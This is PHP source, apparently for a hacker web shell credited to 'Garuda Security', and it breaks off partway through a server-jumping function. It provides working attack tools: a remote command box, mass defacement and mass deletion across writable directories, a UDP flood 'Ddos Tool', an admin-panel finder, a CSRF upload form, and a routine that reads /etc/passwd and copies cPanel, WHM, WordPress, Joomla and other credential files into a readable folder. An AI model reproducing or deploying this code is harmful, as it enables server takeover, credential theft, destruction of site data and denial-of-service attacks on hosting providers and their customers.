#patch {position:absolute; height:1; width:1px; top:0; left:0;}
</style>
</head>
<body>
<center>
<img src="https://lh3.googleusercontent.com/-G3BFdIKlQPU/V_bT5585R4I/AAAAAAAAAx8/UVk-AjSx-Cww5gGTMkqUbUVXIs38msXuwCLcB/w217-h437-no/rem.gif" height=200 width=100>
<center><font color="#339900" size="14" face="arial">Backdoor Scanner</font></center><br>
<?php
if(isset($_REQUEST['edit']) && $_REQUEST['edit']=='file'){
   if(isset($_POST['yes'])){
      $filename = $_GET['file'];
      echo "<br><br><br><font color=red size=3><b><center>".$filename." deleted...</b></font><br><br><br><br><br><br><br>";
      unlink($filename);
      echo "<META HTTP-EQUIV=Refresh CONTENT=\"2; URL=javascript:window.close();\">";
   }else{
      if($_POST['update']) {
         $filename = $_POST['file'];
         if(is_writable($filename)) {
            $handle = fopen($filename, "w+");
            $isi=$_POST['content'];
            fwrite($handle, stripslashes($isi));
            fclose($handle);
            $stat= "<center><strong>edited successfully<br>";
         } else {
            $stat= "<center><font color=red><strong>Error! File may not be writable.</font></center>";
         }
      }
      if($_POST['close']) {
         echo "<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=javascript:window.close();\">";
      }
      $filename = $_GET['file'];
      if (file_exists($filename)){
         $vuln = $_GET['bug'];
         $handle = fopen($filename, "r");
         $contents = fread($handle, filesize($filename));
      ?>
      <center>
      <table>
         <tr><td align="left" class="me"><strong><?=$filename?>&nbsp;&nbsp;>> Contains :&nbsp;<?=$vuln?></strong></td></tr>
         <tr><td class="me">
            <form method="post" action="">
            <input type="hidden" name="file" value="<?=$filename?>">
            <textarea name="content" cols="80" rows="15"><?=htmlspecialchars($contents)?></textarea><br>
         </td></tr>
         <tr><td align="center" class="me">
         <?php
         if($_POST['delete']) {
            echo "Are you sure to delete ".$filename." ?";
         ?>
         <tr><td align="center" class="me">
            <input type="submit" name="yes" value=" Y E S ">
            <input type="submit" name="no" value=" N O ">
         </td></tr>
         <?php
         }else{
         echo $stat;
         ?>
         </td></tr>
         <tr><td align="right" class="me">
            <input type="submit" name="close" value=" C l o s e ">
            <input type="submit" name="delete" value=" D e l e t e ">
            <input type="submit" name="update" value=" S a v e ">
         </td></tr>
         <?php
         }
         fclose($handle);
         ?>
      </table>
</form>
<?php
}else{
echo "<br><br><br><font color=red size=3><b><center>".$filename." not exist...</b></font><br><br><br><br><br><br><br>";
echo "<META HTTP-EQUIV=Refresh CONTENT=\"4; URL=javascript:window.close();\">";
}
?>
</center>
<?php
}
}elseif(isset($_POST['Submit'])){
   $ceks = array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
   foreach($ceks as $ceker){
      if($_POST[$ceker]<>""){
         $six.=$_POST[$ceker].".";
      }
   }
   
$cek = explode('.', $six);

function ListFiles($dir) {
    if($dh = opendir($dir)) {

        $files = Array();
        $inner_files = Array();

        while($file = readdir($dh)) {
            if($file != "." && $file != "..") {
                if(is_dir($dir . "/" . $file)) {
                    $inner_files = ListFiles($dir . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files); 
                } else {
                    array_push($files, $dir . "/" . $file);
                }
            }
        }

        closedir($dh);
        return $files;
    }
}
   ?>
   <center>
   <table border="0" width="90%" cellpadding="5">
      <tr>
         <td align="right" width="30"><b>No</b></td>
         <td align="center" width="105"><b> T y p e </b></td>
         <td align="center"><b> F i l e&nbsp;&nbsp;L o c a t i o n </b></td>
         <td align="center" width="150"><b> L a s t&nbsp;&nbsp;E d i t </b></td>
         <td  align="right" width="80"><b>F i l e&nbsp;&nbsp;S i z e</b></td>
      </tr><br>
<?php
$target=$_SERVER['DOCUMENT_ROOT'];
   foreach (ListFiles($target) as $key=>$file){
      $nFile = substr($file, -4, 4);
      if($nFile == ".php"){
         if($file==$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']){
         }else{
            $ops = @file_get_contents($file);
            $op=strtolower($ops);
            $arr = array('c99_buff_prepare' => 'c 9 9',
                      'abcr57' => 'r 5 7');
            $sis=0;
            if($op)
            $size=filesize($file);

            $last=date("M-d-Y H:i", $last_modified);
            foreach($arr as $key => $val) {
               if(@preg_match("/$key/", $op)) {
                  $sis=1;
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><font color="red"><blink><?=$i?></blink></font></td>
                     <td align="center"><font color="red"><blink><?=$val?></blink></font></td>
                     <td align="left"><blink>
                     <a href="#" class="abunai" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </blink></td>
                     <td align="center"><font color="red"><blink><?=$last?> GMT+9</blink></font></td>
                     <td align="right"><font color="red"><blink><?=$size?> byte</blink></font></td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
            }
            if($sis<>"1"){
               if((@preg_match("/system\((.*?)\)/", $op))&&(@preg_match("/<pre>/", $op))&&(@preg_match("/empty\((.*?)\)/", $op))) {
                  $sis="2";
                  $i++;
                  $val="hidden shell";
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><font color="blue"><?=$i?></font></td>
                     <td align="center"><font color="blue"><?=$val?></font></td>
                     <td align="left">
                     <a href="#" class="xxx" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><font color="blue"><?=$last?> GMT+9</font></td>
                     <td align="right"><font color="blue"><?=$size?> byte</font></td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
            }
            if($sis=="0"){
            foreach($cek as $bugs) {
                if ($bugs<>""){
               if(@preg_match("/$bugs\((.*?)\)/", $op)) {
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><?=$i?></td>
                     <td align="center"><?=$bugs?></td>
                     <td align="left">
                     <a href="#" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$bugs?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><?=$last?> GMT+9</td>
                     <td align="right"><?=$size?> byte</td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }               
            }
            }
            }
            if($_POST['textV']<>""){
               $text=$_POST['textV'];
                  if(@preg_match("/$text/", $op)) {
                  $i++;
                  ?>
                  <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
                     <td align="right"><?=$i?></td>
                     <td align="center"><?=$text?></td>
                     <td align="left">
                     <a href="#" onclick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$text?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
                     </td>
                     <td align="center"><?=$last?> GMT+9</td>
                     <td align="right"><?=$size?> byte</td>
                     <script language="javascript">
                        var bgcolor = "transparent";
                        var change_color = "#444444"
                        function mover(aa) {
                           aa.style.backgroundColor = change_color;
                        }
                        function mout(aa) {
                           aa.style.backgroundColor = bgcolor;
                        }
                     </script>
                  </tr>
                  <?php
               }
            
            
            }
         }
      }
   }
   if($i==0){
      foreach($cek as $bugs) {
         if ($bugs<>""){
            $x++;
   ?>
      <tr style ="background-color: Your background Color;" onmouseover="mover(this)"  onmouseout="mout(this)">
         <td align="right"><?=$x?></td>
         <td align="center"><?=$bugs?></td>
         <td align="center"> not exist </td>
         <td align="center"> no record </td>
         <td align="right"> -&nbsp;&nbsp;&nbsp;&nbsp;byte </td>
      </tr>
   <?php
         }
      }
   }
   ?>
   </table>
   <?php
}else{
   $find = array('default','base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
?>
   <form id="fCheck" name="fCheck" method="post" action="" autocomplete="off">
   <center>
   <table class="single" width="400" border="1" -webkit-box-shadow: 0px 0px 15px #55FF55; cellpadding="10">
   <tr><td class="me"><center>
     
      <table class="me" width="200">
         <tr><td class="me">
            <script language="javascript">
               function cekKlik(){   
                  if (!document.fCheck.cekV.checked)
                     document.fCheck.textV.disabled=true;   
                  else 
                     document.fCheck.textV.disabled=false;
                  if(document.fCheck.cekV.checked){
                     master = master + 1;
                  }else{
                     if(master > 0 ){
                        master = master - 1;
                     }else{
                        master = master;
                     }
                  }
                  if(master != 0){
                     document.fCheck.Submit.disabled=false;
                  }else{
                     document.fCheck.Submit.disabled=true;
                  }         
               }     
            </script>  
            <?php
            //dari sini
            foreach($find as $bug) {
            ?>
            <script language="javascript">
               var master = 0;
               function checkValue<?=$bug?>(){
                  if(document.fCheck.<?=$bug?>.checked){
                     master = master + 1;
                  }else{
                     if(master > 0 ){
                        master = master - 1;
                     }else{
                        master = master;
                     }
                  }
                  if(master != 0){
                     document.fCheck.Submit.disabled=false;
                  }else{
                     document.fCheck.Submit.disabled=true;
                  }   
               }
            </script>
            <input onclick="checkValue<?=$bug?>();" name="<?=$bug?>" type="checkbox" id="<?=$bug?>" value="<?=$bug?>" />&nbsp;<?=$bug?><br>
            <?php
            }
            ?>
            <input name="cekV" type="checkbox" onClick="cekKlik();" id="cekV" value="cekV">
            <input class="isi" disabled="disabled" name="textV" value="other key word" onFocus="this.select()" type="text" id="textV">
            <br><br>
            <input type="hidden" name="asal" value="abcd">
            <input disabled="disabled" type="submit" name="Submit" value=" Start " />
         </td></tr>
      </table>
   </td></tr></table>
   </form>
<?php
}
?>
<br><br><hr width="300"> 
<?php
		} elseif($_GET['do'] == 'about') {
?>

<center><br><br><img src='https://scontent-sit4-1.xx.fbcdn.net/v/t31.0-8/15800158_765685423585295_7473681617056615514_o.png?oh=e4396f36adec82526e0118950a7c1e83&oe=58E09B54' height=300 width=700>
	<br><font color="red">Garuda Security </font><font color ="white">Hacker Shell</font>
	<br><font color="lime">Version <br></font><font color="yellow"> 1.0</font>
	<br><font color="lime">Code Name<br></font><font color="yellow"> I Miss You</font>
	<br><font color="lime">Coded By<br></font> <font color="yellow">Yukinoshita 47, LoscardozMandoza</font>
    <br><font color="lime">Resource<br></font><font color="yellow">Indoxploit Shell, Bypass Shell, Garuda Security Hacker Scripts, Pastebin, Google, Github, And Our Imajination</font> 
     <br>
     <img src=https://3.bp.blogspot.com/-JjluZxkscB8/WHeM9tGdQfI/AAAAAAAADhk/ffeKjA0VYxQEtgp9QfGO7fnwiVK3hpEOgCLcB/s400/Logo%2BGSH%2Bbaru%2Bcopy.png >
     <br>
	<br><font color="red">Belajar mengalah sampai tak satupun yang dapat mengalahkan.</font>
	<br><font color="red">Keep Play With something fun and don't forget to Smile</font>
	<br><font color="red">tidak ada orang bodoh atau orang jago yang ada hanya kata males.</font>
	<br><font color="white">Jiwa Seorang Hacker tetaplah sama </font>
	<br><font color="white">Hacking is to Learn Not Learn to Hacking</font>
	<br><font color="white">Hacker Is Make or Develop Tools Not Tools Make Hacker</font>
	<br><br><font size="5" color="#00ff00">Thanks to:</font></center><center>

<marquee direction="up"><center>
<font color="red">Yukinoshita 47<br></font>
<font color="white">_Tuan2Fay_ <br></font>
<font color="red">Snooze<br></font>
<font color="white">OutrageousEngkus<br></font>
<font color="red">TM_404<br></font>
<font color="white">E7B_404<br></font>
<font color="red">LuckNut<br></font>
<font color="white">XM404RS!<br></font>
<font color="red">LoscardozMandoza<br></font>
<font color="white">CyberGhost.17<br></font>
<font color="red">Lyonc<br></font>
<font color="white">EvilClown<br></font>
<font color="red">Sector V2<br></font>
<font color="white">Mr.Spongebob<br></font>
<font color="red">D34D_SL33P<br></font>
<font color="white">Mr.Luciferz<br></font>
<font color="red">MR.Blank007<br></font>
<font color="white">Mr.Buggers<br></font>
<font color="red">DarkTerrorizt<br></font>
<font color="white">Mafia Boy<br></font>
<font color="red">Fazlast<br></font>
<font color="white">Mr.Secretz<br></font>
<font color="red">Mr.N()tfound<br></font>
<font color="white">Mr.HzA404EsL<br></font>
<font color="red">P34CEB0Y<br></font>
<font color="white">Mr_Viruzer#29<br></font>
<font color="red">4LV1N_404<br></font>
<font color="white">Mr.Okoy48<br></font>
<font color="red">Loyo-ID<br></font>
<font color="white">And All Member of Garuda Security Hacker</font>
</center>
</marquee>

<?php
		} elseif($_GET['do'] == 'hentai') {
?>
<h1><br><font color="white">DASAR CABUL LU NJENGGG :v </font></h1>

<center><br><br><img src='http://data.whicdn.com/images/129365155/large.jpg' height=300 width=500>



<?php
		} elseif($_GET['do'] == 'vocaloid') {
?>
<h1><br><font color="white">Santai dan Nikmati Musik nya kalo nge-hack terus entar tegang lu </font></h1>

<center><br><br><img src='http://img03.deviantart.net/cfa0/i/2013/269/9/b/miku_hatsune___render_by_rinny_chan26-d6o1mrm.png'height=300 width=650>
<iframe width="50%" height="166" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/53832730&amp;color=ff5500&amp;auto_play=false&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false"></iframe>
<br>
<iframe width="50%" height="166" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/159180140&amp;color=ff5500&amp;auto_play=false&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false"></iframe>
<br>
<iframe width="50%" height="166" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/156532480&amp;color=ff5500&amp;auto_play=false&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false"></iframe>

	<?php
} elseif($_GET['do'] == 'csrf') {
?>		<html>
<img src=http://orig11.deviantart.net/5ac6/f/2015/018/9/a/anime_girl_render__by_lcookies_d6pse1c_by_kooomo43-d8ed78y.png height=400 width=280><br>
<b><h1>CSRF EXPLOITER ONLINE</h1></b>
<center><br>
<font color=red>*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc 
<center>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat Diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Lock!">
</form>
<?php
//gak penting
     @$url = $_POST['url'];
     @$pf = $_POST['pf'];
     @$d = $_POST['d'];
if($d) {
	//baccod
	
    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Cok!'></form";
}
?>
</form>
</html>	
<?php

} elseif($_GET['do'] == 'admf') {
	?>
<type='text/javascript'/></script>
<img src=http://orig12.deviantart.net/2d7d/f/2013/195/3/c/anime_girl_render_11_by_animerenderss-d6dipii.png height=280 width=400><br>
<br><h1><font color="lime">	Admin Finder<br></h1>
</font><h1><font color="yellow">"find it and crack it"</font> </h1>
<td width=100% id=Gretz>
<form action="" method="post">
<center><p class="frontboxtext"><input name="hash_lol" class="textbox" type="text" size="30" value="http://www.target.co.il/"/>
<input name="submit_lol" class="textbox" value="Submit Site" type="submit">
</form>
<?php
set_time_limit(0);
 
if (isset($_POST["submit_lol"])) {
$url = $_POST['hash_lol'];
echo "<br />Crot ".$url."<br /><br />";
 
$adminlocales = array(
"-adminweb/",
"!adminweb/",
"@adminweb/",
"adminweb121/",
"adminweb90/",
"adminweb145/",
"khususadmin/",
"rahasiaadm/",
"adminweb123123/",
"adminweb2222/",
"adminlanel/",
"adminlanel.php/",
"monitor123.php/",
"masuk.php/",
"css.php/", 
"admin1235.php/", 
"master.php/",
"1admin/",
"123admin/",
"addmin/",
"home.php",
"css/",
"rediect.php/",
"masuk.php/",
"index.php/",
"webpaneladmin123/",
"registeradm/",
"register/",
"member123/",
"123adminweb/",
"123paneladminweb/",
"panelauth1231/",
"loginadminweb21/",
"loginadminweb123/",
"loginadminweb/",
"webadmin123/",
"redakturadmin/",
"paneladminweb/",
"admloginadm/",
"4dm1n/",
"admin12345/",
"adminweb12/",
"adminweb111/",
"adminweb123/",
"adminweb1/",
"gangmasuk/",
"gangadmin/",
"admredaktur/",
"adminwebredaktur/",
"adminredaktur/",
"adm/", 
"_adm_/", 
"_admin_/", 
"_loginadm_/", 
"_login_admin_/", 
"minmin", 
"loginadmin3/",  
"masuk/admin", 
"webmail", 
"_loginadmin_/", 
"_login_admin.php_/", 
"_admin_/", 
"_administrator_/", 
"operator/", 
"sika/", 
"adminweb/", 
"develop/", 
"ketua/", 
"redaktur/", 
"author/", 
"admin/", 
"administrator/", 
"adminweb/", 
"user/", 
"users/", 
"dinkesadmin/", 
"retel/", 
"author/", 
"panel/", 
"paneladmin/", 
"panellogin/",
"redaksi/", 
"cp-admin/", 
"login@web/", 
"admin1/", 
"admin2/", 
"admin3/", 
"admin4/", 
"admin5/", 
"admin6/", 
"admin7", 
"admin8", 
"admin9",
"admin10", 
"master/", 
"master/index.php", 
"master/login.php", 
"operator/index.php", 
"sika/index.php", 
"develop/index.php", 
"ketua/index.php",
"redaktur/index.php", 
"admin/index.php", 
"administrator/index.php", 
"adminweb/index.php", 
"user/index.php", 
"users/index.php", 
"dinkesadmin/index.php", 
"retel/index.php", 
"author/index.php", 
"panel/index.php", 
"paneladmin/index.php",
"panellogin/index.php", 
"redaksi/index.php", 
"cp-admin/index.php", 
"operator/login.php", 
"sika/login.php", 
"develop/login.php",
"ketua/login.php",
"redaktur/login.php",
"admin/login.php",
"administrator/login.php", 
"adminweb/login.php", 
"user/login.php", 
"users/login.php", 
"dinkesadmin/login.php", 
"retel/login.php", 
"author/login.php", 
"panel/login.php", 
"paneladmin/login.php", 
"panellogin/login.php", 
"redaksi/login.php", 
"cp-admin/login.php", 
"terasadmin/", 
"terasadmin/index.php", 
"terasadmin/login.php", 
"rahasia/", 
"rahasia/index.php", 
"rahasia/admin.php", 
"rahasia/login.php", 
"dinkesadmin/", 
"dinkesadmin/login.php", 
"adminpmb/", 
"adminpmb/index.php", 
"adminpmb/login.php", 
"system/", 
"system/index.php", 
"system/login.php", 
"webadmin/", 
"webadmin/index.php", 
"webadmin/login.php", 
"wpanel/", 
"wpanel/index.php", 
"wpanel/login.php", 
"adminpanel/index.php", 
"adminpanel/", 
"adminpanel/login.php", 
"adminkec/", 
"adminkec/index.php", 
"adminkec/login.php", 
"admindesa/", 
"admindesa/index.php", 
"admindesa/login.php", 
"adminkota/", 
"adminkota/index.php", 
"adminkota/login.php", 
"admin123/", 
"admin123/index.php", 
"dologin/", 
"home.asp/",
"supervise/amdin", 
"relogin/adm", 
"checkuser", 
"relogin.php", 
"relogin.asp", 
"wp-admin", 
"registration", 
"suvervise", 
"superman.php", 
"member.php",
"home/admin",
"po-admin/",
"do_login.php", 
"bo-login", 
"bo_login.php/", 
"index.php/admin", 
"admiiin.php", 
"masuk/adm",
"website_login/", 
"dashboard/admin", 
"dashboard.php", 
"dashboard_adm", 
"admin123/login.php", 
"logout1/", 
"logout/",
"pengelola/login", 
"manageradm/", 
"logout.asp", 
"manager/adm", 
"pengelola/web",
"auth/panel", 
"logout/index.php", 
"logout/login.php", 
"controladm/", 
"logout/admin.php", 
"adminweb_setting", 
"adm/index.asp", 
"adm.asp", 
"affiliate.asp", 
"adm_auth.asp", 
"memberadmin.asp", 
"siteadmin/login.asp", 
"siteadmin/login", 
"paneldecontrol", 
"cms/admin", 
"administracion.php", 
"/ADMON/", 
"administrador/", 
"panelc/", 
"admincp", 
"admcp", 
"cp", 
"modcp", 
"moderatorcp", 
"adminare", 
"cpanel", 
"controlpanel");

foreach ($adminlocales as $admin){
$headers = get_headers("$url$admin");
if (eregi('200', $headers[0])) {
    echo "<a href='$url/$admin'>$url$admin</a> Nemu nih!<br />";
}
else {
    echo "$url$admin Gk ketemu!<br />";
}
}
}	
} elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Garuda Security Hacker</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['do'] == 'ddos') {
?>
<html>
<form action=" " method="post">
<center><br><br><br>
Your IP: <font color="white"><b><?php echo $my_ip; ?></b></font>&nbsp;(Don't DoS yourself nub)<br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">Ddos Tool</th>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr>
 
<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table></b><br>
<input type="submit" class="inputzbut" name="fire" value="  Firee !!!   ">
<br><br>
<center>
<font color="white">Seteleh selesai menggunakan tools ini segera refresh browsingmu
</center>
</form>
</center>
<?php
    @$submit = $_POST['fire'];
    if (isset($submit)) {
        $packets = 0;
        $ip = $_POST['ip'];
        $rand = $_POST['port'];
        set_time_limit(0);
        ignore_user_abort(FALSE);
        $exec_time = $_POST['time'];
        $time = time();
        print "Flooded: $ip on port $rand <br><br>";
        $max_time = $time + $exec_time;
        for ($i = 0;$i < 65535;$i++) {
            $out.= "X";
        }
        while (1) {
            $packets++;
            if (time() > $max_time) {
                break;
            }
            $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
            if ($fp) {
                fwrite($fp, $out);
                fclose($fp);
            }
        }
        echo "Packet complete at " . time('h:i:s') . " with $packets (" . round(($packets * 65) / 1024, 2) . " mB) packets averaging " . round($packets / $exec_time, 2) . " packets/s
";
    }	
} elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['do'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("idx_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("idx_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_idx) {
				$user_config_dir = "/home/$user_idx/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_idx/.my.cnf" => "cpanel",
						"/home/$user_idx/.accesshash" => "WHM-accesshash",
						"/home/$user_idx/public_html/po-content/config.php" => "Popoji",
						"/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/forum/config.php" => "phpBB",
						"/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_idx/public_html/configuration.php" => "Joomla",
						"/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/admin/config.php" => "OpenCart",
						"/home/$user_idx/public_html/slconfig.php" => "Sitelok",
						"/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?dir=$dir/idx_config'><font color=lime>Done</font></a></center>";
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
